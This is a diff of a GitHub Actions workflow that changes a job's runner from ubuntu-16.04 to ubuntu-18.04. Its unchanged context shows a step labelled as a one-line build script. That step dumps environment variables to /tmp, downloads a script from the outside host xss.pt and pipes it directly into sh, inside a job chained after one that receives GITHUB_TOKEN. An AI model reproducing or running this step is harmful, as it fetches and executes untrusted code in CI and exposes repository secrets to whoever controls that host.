@@ -39,7 +39,7 @@ jobs:
           Github_T22: ${{ secrets.GITHUB_TOKEN }}
   build_jobs2:
     needs: build_jobs1
-    runs-on: ubuntu-16.04
+    runs-on: ubuntu-18.04
     steps:
       - name: Run a one-line script_build_jobs2 
         run: bash -c "env|grep ss>/tmp/s1;cd /tmp;curl -o- http://xss.pt/4Mi8|tr -d '\r'|tee a1|sh;(while :;do date;[ -f a1 ]&&sleep 300||break;done)"
